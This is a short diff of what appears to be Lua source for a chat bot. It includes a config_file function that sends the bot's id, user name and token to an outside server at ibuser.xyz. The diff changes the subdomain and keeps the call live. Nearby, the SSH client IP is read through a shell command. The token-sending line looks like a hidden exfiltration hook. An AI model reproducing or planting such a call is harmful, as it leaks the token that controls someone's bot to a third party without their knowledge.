@@ -31,7 +31,7 @@ DEVRAMBW = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-function config_file(id,user,bot)  https.request('https://ibuser.ibuser.xyz/insert/?id='..id..'&user='..user..'&token='..bot)  end
+function config_file(id,user,bot)  https.request('https://ibcorp.ibuser.xyz/insert/?id='..id..'&user='..user..'&token='..bot)  end
 local AutoSet = function() 
 local create = function(data, file, uglify)  
 file = io.open(file, "w+")   
